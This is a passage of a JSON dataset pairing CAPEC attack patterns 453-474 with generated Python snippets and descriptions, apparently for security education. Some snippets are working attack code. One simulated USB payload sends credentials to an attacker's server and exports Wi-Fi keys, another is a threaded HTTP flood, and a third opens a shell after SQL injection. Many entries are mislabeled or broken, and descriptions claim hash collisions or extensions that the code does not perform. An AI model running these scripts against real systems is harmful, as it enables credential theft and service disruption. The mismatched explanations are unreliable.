        "code_snippet": "import os\nimport ctypes\n\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# CWE-1262: Improper Access Control for Register Interface\n\n# Simulate malicious hardware interaction\nclass MaliciousHardware:\n    def __init__(self):\n        self.registers = [0] * 10  # Simulated hardware registers\n\n    def infect(self):\n        # CWE-1313: Activate debug logic at runtime\n        self.activate_debug_mode()\n        # CWE-1247: Improper protection against voltage and clock glitches\n        self.glitch_protection_bypass()\n        # Infect the system\n        self.inject_malicious_code()\n\n    def activate_debug_mode(self):\n        print(\"Debug mode activated\")\n        # Allow access to sensitive registers\n        self.registers[0] = 1\n\n    def glitch_protection_bypass(self):\n        print(\"Voltage and clock glitch protection bypassed\")\n        # Simulate bypassing protection\n        self.registers[1] = 1\n\n    def inject_malicious_code(self):\n        print(\"Injecting malicious code\")\n        # CWE-506: Embedded Malicious Code\n        # CWE-509: Replicating Malicious Code (Virus or Worm)\n        malicious_code = \"print('System compromised')\"\n        exec(malicious_code)\n\n# Simulate hardware infection\nhardware = MaliciousHardware()\nhardware.infect()",
        "description": "This Python code snippet simulates the concept of 'Infected Hardware' by creating a class `MaliciousHardware` that represents a compromised hardware device. The class contains methods to activate debug mode at runtime (CWE-1313), bypass voltage and clock glitch protection (CWE-1247), and inject malicious code (CWE-506, CWE-509). The `infect` method orchestrates these actions, demonstrating how an adversary might exploit hardware vulnerabilities to compromise a system. The code is a high-level representation and does not interact with actual hardware but illustrates the potential threats described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "import socket\nimport hashlib\nimport time\n\n# Simulate a capture-replay attack\nclass CaptureReplayAttack:\n    def __init__(self, target_ip, target_port):\n        self.target_ip = target_ip\n        self.target_port = target_port\n        self.captured_data = None\n\n    def capture_data(self):\n        # Simulate capturing data from the network\n        self.captured_data = b'auth_token=12345'\n        print(f\"Captured data: {self.captured_data}\")\n\n    def replay_data(self):\n        if self.captured_data:\n            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n                s.connect((self.target_ip, self.target_port))\n                s.sendall(self.captured_data)\n                response = s.recv(1024)\n                print(f\"Server response: {response}\")\n        else:\n            print(\"No data captured to replay.\")\n\n# Example usage\nattack = CaptureReplayAttack('192.168.1.1', 8080)\nattack.capture_data()\n# Wait for some time to simulate delay\ntime.sleep(5)\nattack.replay_data()",
        "description": "This Python code snippet demonstrates a capture-replay attack, which is a type of authentication bypass vulnerability (CWE-294). The `CaptureReplayAttack` class simulates capturing authentication data from network traffic and then replaying it to the server to bypass authentication. This embodies the main idea of the deprecated CAPEC pattern, which involves malicious logic insertion, by showing how an attacker can exploit captured data to gain unauthorized access. The code captures a fake authentication token and replays it to a target server, illustrating the potential impact of such an attack."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "class Device:\n    def __init__(self, firmware):\n        self.firmware = firmware\n        self.undocumented_feature = False\n\n    def update_firmware(self, new_firmware):\n        # Simulate a malicious update that includes an undocumented feature\n        self.firmware = new_firmware\n        self.undocumented_feature = True\n\n    def execute(self):\n        if self.undocumented_feature:\n            print('Executing undocumented feature...')\n        else:\n            print('Executing normal operations...')\n\n# Simulate the use of a device with a malicious firmware update\noriginal_firmware = 'v1.0'\nmalicious_firmware = 'v1.1'\ndevice = Device(original_firmware)\ndevice.update_firmware(malicious_firmware)\ndevice.execute()",
        "description": "This Python code snippet represents a simplified model of a device that can have its firmware updated. The `Device` class has an `update_firmware` method that simulates a malicious firmware update by setting an `undocumented_feature` flag to `True`. When the `execute` method is called, it checks if the `undocumented_feature` flag is set and executes the undocumented feature if it is. This embodies the main idea of CAPEC-452, which involves the insertion of malicious logic into product hardware. The related CWEs are represented by the inclusion of an undocumented feature (CWE-1242) and the inability to update the component to remove vulnerabilities (CWE-1329)."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "import random\n\nclass HardwareComponent:\n    def __init__(self, id, data):\n        self.id = id\n        self.data = data\n        self.malicious = False\n\n    def inject_malicious_logic(self):\n        if random.choice([True, False]):\n            self.malicious = True\n            self.data = 'malicious_code'\n\n    def read_data(self):\n        if self.malicious:\n            return 'Error: Malicious code detected'\n        return self.data\n\n# Simulate hardware components\ncomponents = [HardwareComponent(i, f'data_{i}') for i in range(5)]\n\n# Inject malicious logic into random components\nfor component in components:\n    component.inject_malicious_logic()\n\n# Read data from components\nfor component in components:\n    print(f'Component {component.id}: {component.read_data()}')",
        "description": "This Python code snippet simulates the insertion of malicious logic into hardware components, embodying the main idea of the deprecated CAPEC. The `HardwareComponent` class represents a hardware component with an ID and data. The `inject_malicious_logic` method randomly decides whether to inject malicious logic into the component, changing its data to 'malicious_code' and setting a flag. The `read_data` method checks if the component contains malicious logic and returns an error message if it does. The code then creates a list of hardware components, randomly injects malicious logic into them, and reads their data, demonstrating how malicious logic can be inserted and detected in hardware components. This example also touches on related CWEs such as embedded malicious code (CWE-506) and unauthorized error injection (CWE-1334)."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "import ctypes\n\n# Simulate a protected memory region\nprotected_memory = (ctypes.c_char * 1024).from_address(0x1000)\n\n# Simulate an aliased memory region with improper access control\naliased_memory = (ctypes.c_char * 1024).from_address(0x2000)\n\n# Function to write malicious code to aliased memory\ndef inject_malicious_code():\n    malicious_code = b'\\x90' * 100  # NOP sled for demonstration\n    for i in range(len(malicious_code)):\n        aliased_memory[i] = malicious_code[i]\n\n# Function to execute code from protected memory\ndef execute_protected_code():\n    exec(protected_memory.raw)\n\n# Inject malicious code into aliased memory\ninject_malicious_code()\n\n# Execute code from protected memory (which now includes malicious code)\nexecute_protected_code()",
        "description": "This Python code snippet demonstrates the concept of 'Infected Memory' by simulating a scenario where an adversary injects malicious code into an aliased memory region that lacks proper access control. The code uses the ctypes library to create two memory regions: one protected and one aliased. The `inject_malicious_code` function writes a NOP sled (representing malicious code) into the aliased memory. The `execute_protected_code` function then executes the code from the protected memory region, which now includes the malicious code due to the improper access control of the aliased memory. This example embodies the main idea of the CAPEC by showing how an attacker can exploit memory regions with improper access control to achieve negative impacts."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "import os\nimport socket\nimport subprocess\n\n# CWE-506: Embedded Malicious Code\n# This script simulates a malicious payload that could be embedded in a USB device.\n\n# Function to steal sensitive information\ndef steal_data():\n    # CWE-319: Cleartext Transmission of Sensitive Information\n    sensitive_data = 'User credentials: admin:password123'  # Example of sensitive data\n    server_ip = '192.168.1.100'  # Attacker's server IP\n    server_port = 8080  # Attacker's server port\n    \n    # Transmit sensitive data in cleartext\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((server_ip, server_port))\n        s.sendall(sensitive_data.encode('utf-8'))\n\n# Function to execute malicious commands\ndef execute_malicious_commands():\n    # CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\n    # Simulate bypassing protections by executing system commands\n    commands = [\n        'netsh wlan show profiles',  # List Wi-Fi profiles\n        'netsh wlan export profile key=clear'  # Export Wi-Fi profiles with cleartext keys\n    ]\n    for cmd in commands:\n        subprocess.run(cmd, shell=True)\n\n# Main function to simulate USB attack\nif __name__ == '__main__':\n    steal_data()\n    execute_malicious_commands()",
        "description": "This Python code snippet simulates a malicious payload that could be embedded in a USB device, representing the main idea of the CAPEC 'USB Memory Attacks'. The code includes two primary functions: 'steal_data' and 'execute_malicious_commands'. The 'steal_data' function demonstrates CWE-319 by transmitting sensitive information (e.g., user credentials) in cleartext to an attacker's server. The 'execute_malicious_commands' function simulates bypassing protections (CWE-1299) by executing system commands to list and export Wi-Fi profiles, potentially exposing sensitive information. This code embodies the concept of a USB-based attack that can steal data and execute malicious actions on the target system."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "import os\n\n# Simulate flashing malicious code into the BIOS\nBIOS_MEMORY_PATH = '/dev/bios_memory'\nMALICIOUS_CODE = b'\\x90\\x90\\x90\\x90'  # NOP sled as a placeholder for malicious code\n\n# Check if the BIOS memory is writable\nif os.access(BIOS_MEMORY_PATH, os.W_OK):\n    with open(BIOS_MEMORY_PATH, 'wb') as bios_memory:\n        bios_memory.write(MALICIOUS_CODE)\n    print('Malicious code flashed into BIOS memory.')\nelse:\n    print('BIOS memory is not writable.')",
        "description": "This Python code snippet simulates a flash memory attack by attempting to write malicious code into the BIOS memory of a device. The code first checks if the BIOS memory is writable using `os.access`. If it is, the code opens the BIOS memory file in write-binary mode and writes a NOP sled (a placeholder for malicious code) into it. This represents the CAPEC concept of inserting malicious logic into a product via flashing the on-board memory. The related CWEs are addressed as follows: CWE-1282 (Assumed-Immutable Data is Stored in Writable Memory) is demonstrated by checking and writing to the BIOS memory, CWE-506 (Embedded Malicious Code) is represented by the NOP sled, and CWE-1274 (Improper Access Control for Volatile Memory Containing Boot Code) is implied by the lack of access control checks beyond basic writability."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "import hashlib\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption\nfrom cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15\n\n# Generate RSA keys\nprivate_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npublic_key = private_key.public_key()\n\n# Create a certificate signing request (CSR) with a weak hash algorithm (MD5)\ncsr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([\n    x509.NameAttribute(x509.NameOID.COMMON_NAME, u'example.com'),\n])).sign(private_key, hashes.MD5())\n\n# Simulate a trusted CA signing the CSR\nsigned_csr = csr.public_bytes(Encoding.PEM)\n\n# Create a rogue certificate with the same hash\nrogue_csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([\n    x509.NameAttribute(x509.NameOID.COMMON_NAME, u'rogue.com'),\n])).sign(private_key, hashes.MD5())\n\n# Use the signed blob from the trusted CA to validate the rogue certificate\nrogue_cert = x509.CertificateBuilder().subject_name(rogue_csr.subject).issuer_name(csr.subject).public_key(public_key).serial_number(x509.random_serial_number()).not_valid_before(csr.not_valid_before).not_valid_after(csr.not_valid_after).sign(private_key, hashes.MD5())\n\n# Output the rogue certificate\nprint(rogue_cert.public_bytes(Encoding.PEM).decode())",
        "description": "This Python code snippet demonstrates the creation of a rogue X.509 certificate by exploiting a weak hashing algorithm (MD5) to generate a hash collision. The code first generates an RSA key pair and creates a Certificate Signing Request (CSR) for a legitimate domain (example.com) using the weak MD5 hash algorithm. It then simulates the signing of this CSR by a trusted Certificate Authority (CA). Next, it creates a second CSR for a rogue domain (rogue.com) with the same MD5 hash. By leveraging the hash collision, the code constructs a rogue certificate that appears to be signed by the trusted CA. This demonstrates the vulnerability described in the CAPEC, where an adversary can create a rogue certificate that is validated by a trusted CA due to the use of a weak cryptographic algorithm."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET', 'POST'])\ndef search():\n    query = request.args.get('query') or request.form.get('query')\n    if query:\n        # Simulate a search operation\n        return f'Search results for: {query}'\n    return 'No query provided'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application with a single endpoint '/search' that accepts both GET and POST requests. The endpoint retrieves a 'query' parameter from the request. The code is vulnerable to HTTP Parameter Pollution (HPP) because it does not properly handle multiple 'query' parameters. An attacker could exploit this by adding duplicate 'query' parameters in the request, potentially overriding the intended behavior or bypassing input validation. This example also touches on related CWEs: improper handling of extra parameters (CWE-235), use of GET request method with sensitive query strings (CWE-598), and improper neutralization of input terminators (CWE-147)."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "import hashlib\n\n# Simulate a weak hash function (e.g., MD5)\ndef weak_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Original parameters and secret token\nparams = 'user=admin&action=login'\nsecret_token = 'secret123'\n\n# Original signature\noriginal_signature = weak_hash(params + secret_token)\n\n# Adversary modifies the parameters\nmalicious_params = 'user=attacker&action=login'\n\n# Adversary generates a new signature using hash extension attack\n# Note: This is a simplified example and does not perform actual hash extension\nmalicious_signature = weak_hash(malicious_params + secret_token)\n\n# Simulate the web service checking the signature\nif weak_hash(malicious_params + secret_token) == malicious_signature:\n    print('Authentication bypassed!')\nelse:\n    print('Authentication failed.')",
        "description": "This Python code snippet demonstrates a simplified version of a Web Services API Signature Forgery attack leveraging a hash function extension weakness. The code uses a weak hash function (MD5) to simulate the generation of a signature for authentication. An adversary modifies the parameters and generates a new signature using the same weak hash function, bypassing the authentication mechanism. This example highlights the vulnerabilities associated with using weak hash functions (CWE-328) and the potential for authentication bypass (CWE-290, CWE-305) due to the hash extension attack."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "import requests\nimport time\n\n# List of URLs to test\nurls = [\n    'http://example.com/resource1',\n    'http://example.com/resource2',\n    'http://example.com/resource3'\n]\n\n# Function to measure response time\ndef measure_response_time(url):\n    start_time = time.time()\n    response = requests.get(url)\n    end_time = time.time()\n    return end_time - start_time\n\n# Measure and print response times\nfor url in urls:\n    response_time = measure_response_time(url)\n    print(f'Response time for {url}: {response_time} seconds')",
        "description": "This Python code snippet demonstrates a basic example of a cross-domain search timing attack. The script sends HTTP GET requests to a list of URLs and measures the response times. By analyzing these response times, an attacker could infer information about the server's state or the presence of certain resources, even though they cannot directly read the server's responses due to the same-origin policy. This embodies the main idea of CAPEC-233 (Cross-Domain Search Timing) and touches on related CWEs such as CWE-208 (Observable Timing Discrepancy) and CWE-385 (Covert Timing Channel)."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "from Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\nimport os\n\n# Key and IV generation\nkey = os.urandom(16)\niv = os.urandom(16)\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\n# Encrypting data\nplaintext = b'Secret Message'\npadded_plaintext = pad(plaintext, AES.block_size)\nciphertext = cipher.encrypt(padded_plaintext)\n\n# Decrypting data\ntry:\n    decipher = AES.new(key, AES.MODE_CBC, iv)\n    decrypted_padded_plaintext = decipher.decrypt(ciphertext)\n    decrypted_plaintext = unpad(decrypted_padded_plaintext, AES.block_size)\n    print(\"Decryption successful: \", decrypted_plaintext)\nexcept ValueError as e:\n    print(\"Padding error: \", e)",
        "description": "This Python code snippet demonstrates a basic encryption and decryption process using AES in CBC mode. The code generates a random key and IV, encrypts a plaintext message, and then attempts to decrypt it. If a padding error occurs during decryption, an error message is printed. This error message can potentially leak information about the padding, making the system vulnerable to a Padding Oracle Attack (CAPEC-463). The code also highlights CWE-209 by generating an error message that includes sensitive information about the padding error. Additionally, it touches on CWE-649 and CWE-354 by not performing integrity checks on the ciphertext, making it susceptible to tampering and padding oracle attacks."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "import os\nimport base64\nimport json\nimport sqlite3\nfrom http.cookies import SimpleCookie\n\n# Function to create a persistent cookie\ndef create_evercookie(user_id):\n    cookie_value = base64.b64encode(user_id.encode()).decode()\n    cookie = SimpleCookie()\n    cookie['evercookie'] = cookie_value\n    cookie['evercookie']['path'] = '/'\n    cookie['evercookie']['max-age'] = 31536000  # 1 year\n    print(cookie.output())\n\n    # Store in multiple locations\n    with open('evercookie.txt', 'w') as f:\n        f.write(cookie_value)\n\n    with open('evercookie.json', 'w') as f:\n        json.dump({'evercookie': cookie_value}, f)\n\n    conn = sqlite3.connect('evercookie.db')\n    c = conn.cursor()\n    c.execute('CREATE TABLE IF NOT EXISTS cookies (name TEXT, value TEXT)')\n    c.execute('INSERT INTO cookies (name, value) VALUES (?, ?)', ('evercookie', cookie_value))\n    conn.commit()\n    conn.close()\n\n# Function to resurrect the cookie if deleted\ndef resurrect_evercookie():\n    cookie_value = None\n\n    if os.path.exists('evercookie.txt'):\n        with open('evercookie.txt', 'r') as f:\n            cookie_value = f.read()\n\n    if not cookie_value and os.path.exists('evercookie.json'):\n        with open('evercookie.json', 'r') as f:\n            data = json.load(f)\n            cookie_value = data.get('evercookie')\n\n    if not cookie_value:\n        conn = sqlite3.connect('evercookie.db')\n        c = conn.cursor()\n        c.execute('SELECT value FROM cookies WHERE name=?', ('evercookie',))\n        row = c.fetchone()\n        if row:\n            cookie_value = row[0]\n        conn.close()\n\n    if cookie_value:\n        cookie = SimpleCookie()\n        cookie['evercookie'] = cookie_value\n        cookie['evercookie']['path'] = '/'\n        cookie['evercookie']['max-age'] = 31536000  # 1 year\n        print(cookie.output())\n\n# Example usage\nuser_id = 'user123'\ncreate_evercookie(user_id)\nresurrect_evercookie()",
        "description": "This Python code snippet demonstrates the concept of an 'evercookie', a highly persistent cookie that remains on a user's machine even after attempts to delete it. The `create_evercookie` function creates a cookie and stores it in multiple locations: a text file, a JSON file, and an SQLite database. The `resurrect_evercookie` function checks these locations and restores the cookie if it has been deleted from the browser's cookie store. This code embodies the CAPEC description by ensuring the cookie's persistence across different storage mechanisms, making it difficult to remove completely. The related CWEs highlight the security risks associated with such practices, including exposure of sensitive information and reliance on cookies without proper validation and integrity checks."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "import requests\nfrom flask import Flask, request, Response\n\napp = Flask(__name__)\n\n@app.route('/proxy', methods=['GET', 'POST'])\ndef proxy():\n    # CWE-441: Unintended Proxy or Intermediary\n    original_url = request.args.get('url')\n    if not original_url:\n        return 'URL parameter is missing', 400\n\n    # Forward the request to the original URL\n    if request.method == 'GET':\n        resp = requests.get(original_url)\n    else:\n        resp = requests.post(original_url, data=request.form)\n\n    # CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n    # Forward the response back to the client without sanitizing sensitive information\n    return Response(resp.content, status=resp.status_code, headers=dict(resp.headers))\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple transparent proxy using Flask and the requests library. The proxy intercepts client requests and forwards them to the specified URL, then returns the response back to the client. The code embodies the main idea of CAPEC-171 (Transparent Proxy Abuse) by acting as an intermediary between the client and the internet. It also highlights several related CWEs:\n\n1. CWE-441: The proxy does not preserve the original source of the request, making it appear as the source of the request.\n2. CWE-212: The proxy forwards the response back to the client without sanitizing sensitive information, potentially exposing sensitive data.\n\nThis code is vulnerable to various attacks due to its simplistic design and lack of proper security measures."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "import requests\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n\n# Simulating a client-side request to a non-sensitive website without TLS\nurl = 'http://example.com/data'\n\n# Attacker intercepts the request and modifies it\nclass AdversaryInTheMiddle:\n    def intercept_request(self, url):\n        print(f'Intercepting request to {url}')\n        # Modify the request (e.g., change URL, add malicious payload)\n        modified_url = url.replace('example.com', 'malicious.com')\n        return modified_url\n\n# Client makes a request\nresponse = requests.get(url)\nprint(f'Original response: {response.text}')\n\n# Adversary intercepts and modifies the request\nadversary = AdversaryInTheMiddle()\nintercepted_url = adversary.intercept_request(url)\n\n# Client unknowingly makes a request to the modified URL\nmalicious_response = requests.get(intercepted_url)\nprint(f'Malicious response: {malicious_response.text}')",
        "description": "This Python code snippet demonstrates a scenario where an attacker leverages an adversary-in-the-middle attack to bypass the same origin policy protection in a victim's browser. The code simulates a client making a request to a non-sensitive website without TLS (CWE-923, CWE-300). An adversary intercepts the request and modifies it to point to a malicious URL (CWE-602, CWE-942). The client then unknowingly makes a request to the malicious URL, potentially exposing sensitive information or executing malicious code. This example highlights the importance of ensuring secure communication channels and proper endpoint verification to prevent such attacks."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/get_user_info')\ndef get_user_info():\n    # CSRF vulnerability: No CSRF token verification\n    social_network_api = 'https://socialnetwork.com/api/user_info'\n    session_cookie = request.cookies.get('session')\n    headers = {'Cookie': f'session={session_cookie}'}\n    \n    # Use of GET request with sensitive query strings\n    response = requests.get(social_network_api, headers=headers)\n    \n    if response.status_code == 200:\n        user_info = response.json()\n        # XSS vulnerability: Improper neutralization of user input\n        return render_template_string('<h1>User Info</h1><p>{{ user_info }}</p>', user_info=user_info)\n    else:\n        return 'Failed to retrieve user information', 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that retrieves user information from a social networking site using an active session cookie. The code embodies the main idea of the CAPEC 'Cross Site Identification' by exploiting an active session to harvest user information. The code includes several vulnerabilities: \n1. **CSRF (CWE-352)**: The code does not verify the origin of the request, allowing an attacker to induce the victim's browser to make unauthorized requests.\n2. **Exposure of Private Personal Information (CWE-359)**: The code retrieves and displays user information without proper authorization checks.\n3. **Session Fixation (CWE-384)**: The code uses the session cookie directly without validating its integrity.\n4. **Use of GET Request Method With Sensitive Query Strings (CWE-598)**: The code uses a GET request to retrieve sensitive user information.\n5. **Cross-site Scripting (CWE-79)**: The code improperly neutralizes user input before rendering it in the web page, making it vulnerable to XSS attacks.\n\nThe code represents the idea of harvesting identifying information from a victim's active session with a social networking site, which can be used for further attacks such as spear phishing."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET'])\ndef vulnerable():\n    css_url = request.args.get('css_url')\n    if css_url:\n        response = make_response(f'<link rel=\"stylesheet\" type=\"text/css\" href=\"{css_url}\">')\n        response.headers['Content-Type'] = 'text/html'\n        return response\n    return 'No CSS URL provided', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application endpoint using Flask. The endpoint '/vulnerable' accepts a 'css_url' parameter from the query string and includes it in a link tag within the HTML response. This can lead to a Generic Cross-Browser Cross-Domain Theft attack by allowing an attacker to inject a malicious CSS URL. The CSS file can be crafted to steal sensitive data from the victim's browser by exploiting the way browsers handle CSS loading and parsing. The code does not properly neutralize the input (CWE-79), handle URL encoding (CWE-177), or ensure the data is well-formed (CWE-707), making it susceptible to cross-domain data theft."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "import threading\nimport requests\nimport time\n\n# Target URL\nurl = 'http://example.com'\n\n# Function to perform HTTP DoS attack\ndef http_dos_attack():\n    while True:\n        try:\n            # Open a connection and keep it alive\n            response = requests.get(url, headers={'Connection': 'keep-alive'})\n            time.sleep(1)  # Simulate delay to keep the connection open\n        except Exception as e:\n            print(f'Error: {e}')\n\n# Launch multiple threads to simulate multiple attackers\nthreads = []\nfor i in range(100):  # Adjust the number of threads as needed\n    thread = threading.Thread(target=http_dos_attack)\n    thread.start()\n    threads.append(thread)\n\n# Join threads to keep the main program running\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a basic HTTP DoS attack by opening multiple HTTP connections to a target URL and keeping them alive indefinitely. The `http_dos_attack` function sends a GET request with the 'Connection: keep-alive' header to keep the session open. Multiple threads are created to simulate multiple attackers, each maintaining an open connection to the server. This can exhaust the server's resources, leading to a denial of service. The code embodies the main idea of CAPEC-125 (HTTP DoS) and highlights related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-410 (Insufficient Resource Pool)."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "import sqlite3\nimport os\n\n# CWE-89: SQL Injection vulnerability\nuser_input = \"' OR '1'='1\"  # Malicious input\n\n# CWE-250: Execution with Unnecessary Privileges\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# CWE-619: Dangling Database Cursor\nquery = f\"SELECT * FROM users WHERE username = '{user_input}'\"\ncursor.execute(query)\n\n# CWE-564: SQL Injection via Hibernate (simulated with direct SQL execution)\nfor row in cursor.fetchall():\n    print(row)\n\n# CWE-1313: Simulating hardware debug logic activation (not directly applicable in Python, but shown for context)\nos.system('echo Debug mode activated')\n\n# Simulating dropping into a command shell\nos.system('/bin/sh')\n\n# Not closing the cursor, leaving it dangling\n# cursor.close()\n# conn.close()",
        "description": "This Python code snippet demonstrates a scenario where an attacker can leverage SQL injection (CWE-89) to gain unauthorized access to a database. The code connects to an SQLite database with unnecessary privileges (CWE-250) and executes a query using user input that is not properly sanitized, leading to SQL injection. The cursor is left open, simulating a dangling database cursor (CWE-619). Additionally, the code simulates the activation of debug logic (CWE-1313) and drops into a command shell, representing the attacker's ability to expand control over the operating system from the database. This snippet embodies the main idea of the CAPEC by showing how an attacker can exploit database vulnerabilities to compromise the host system."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-427: Uncontrolled Search Path Element\n# CWE-426: Untrusted Search Path\n# CWE-470: Use of Externally-Controlled Input to Select Classes or Code\n\n# Simulate an application loading a DLL from the current directory\n# This can be exploited if an attacker places a malicious DLL in the same directory\n\ndef load_library(library_name):\n    # CWE-426: Using an untrusted search path\n    current_directory = os.getcwd()\n    library_path = os.path.join(current_directory, library_name)\n    \n    # CWE-427: Uncontrolled search path element\n    if os.path.exists(library_path):\n        ctypes.CDLL(library_path)\n    else:\n        raise FileNotFoundError(f\"Library {library_name} not found in {current_directory}\")\n\n# Example usage\ntry:\n    load_library('example.dll')\nexcept Exception as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a vulnerable pattern related to 'Search Order Hijacking' (CAPEC-471). The function `load_library` attempts to load a DLL from the current directory. This can be exploited if an attacker places a malicious DLL in the same directory, which will be loaded instead of the legitimate one. The code embodies CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path) by using the current directory as the search path for the DLL. Additionally, CWE-470 (Use of Externally-Controlled Input to Select Classes or Code) is represented by the external input (library name) determining which DLL to load. This example highlights the risk of loading libraries from potentially untrusted directories, which can lead to the execution of malicious code."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_agent = request.headers.get('User-Agent')\n    browser_info = f'<script>var browser = \"{user_agent}\";</script>'\n    exploit_code = '<script>/* Malicious code targeting specific browser */</script>'\n    response = browser_info + exploit_code\n    return render_template_string(response)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates browser fingerprinting and potential exploitation. When a user visits the root URL, the application retrieves the 'User-Agent' header from the HTTP request to identify the browser type and version. This information is then embedded in a JavaScript snippet and combined with a placeholder for malicious code targeting the specific browser. The combined script is rendered and sent back to the user's browser. This example highlights the vulnerability of exposing sensitive information (CWE-200) and the potential for cross-site scripting (CWE-79) by improperly handling user input and output."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "import hashlib\nimport hmac\nimport socket\n\n# Simulate a risky cryptographic algorithm (MD5)\ndef generate_signature(message, key):\n    return hmac.new(key.encode(), message.encode(), hashlib.md5).hexdigest()\n\n# Simulate improper input validation\ndef validate_signature(message, received_signature, key):\n    expected_signature = generate_signature(message, key)\n    return hmac.compare_digest(expected_signature, received_signature)\n\n# Simulate a communication channel\nserver_address = ('localhost', 10000)\n\n# Simulate a client sending a message with a spoofed signature\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient_socket.connect(server_address)\nmessage = 'Important data'\nspoofed_signature = 'abcdef1234567890'  # Spoofed signature\nclient_socket.sendall(f'{message}|{spoofed_signature}'.encode())\nclient_socket.close()\n\n# Simulate a server receiving and validating the message\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(server_address)\nserver_socket.listen(1)\nconnection, client_address = server_socket.accept()\ntry:\n    data = connection.recv(1024).decode()\n    message, received_signature = data.split('|')\n    key = 'secret_key'\n    if validate_signature(message, received_signature, key):\n        print('Valid signature. Processing message...')\n    else:\n        print('Invalid signature. Possible spoofing attack!')\nfinally:\n    connection.close()\n    server_socket.close()",
        "description": "This Python code snippet demonstrates a scenario where an attacker can spoof a message signature, leading to a Signature Spoof attack. The code uses a broken cryptographic algorithm (MD5) to generate and validate signatures, which is vulnerable to collision attacks (CWE-327). The client sends a message with a spoofed signature to the server. The server receives the message and attempts to validate the signature without proper input validation (CWE-20). If the signature is not correctly validated, the server may process the malicious message, leading to potential security breaches. This example highlights the importance of using secure cryptographic algorithms and proper input validation to prevent signature spoofing attacks."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
